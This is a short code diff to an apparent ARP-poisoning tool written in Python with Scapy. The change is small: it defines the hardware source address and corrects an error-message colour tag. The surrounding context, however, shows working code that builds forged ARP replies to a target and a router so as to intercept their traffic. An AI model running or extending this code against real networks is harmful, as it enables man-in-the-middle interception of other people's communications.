@@ -44,7 +44,7 @@ def arp_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
 
     #fake mac variable (not important)
     # fake_mac = "00:11:22:33:44:55"  
-    
+    hwsrc = source_mac
     #ARP Broadcast Packet
     packet_for_target = Ether(dst=router_mac, src=hwsrc) / ARP(op=2, psrc=target_ip, hwsrc=source_mac, hwdst=router_mac, pdst=router_ip)
     packet_for_router = Ether(dst=target_mac,src=hwsrc) / ARP(op=2, psrc=router_ip, hwsrc=source_mac, hwdst=target_mac, pdst=target_ip)
@@ -61,7 +61,7 @@ def arp_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
             console.print("[green]...\n")
             console.print("[blue]ARP Poisoning completed. Press Ctrl+C to stop.")
     except Exception as e:
-        console.print("[Red] Failed to Send Poisoning Packets. Please Try Again. \n")
+        console.print("[red]Failed to Send Poisoning Packets. Please Try Again. \n")
 
 
 
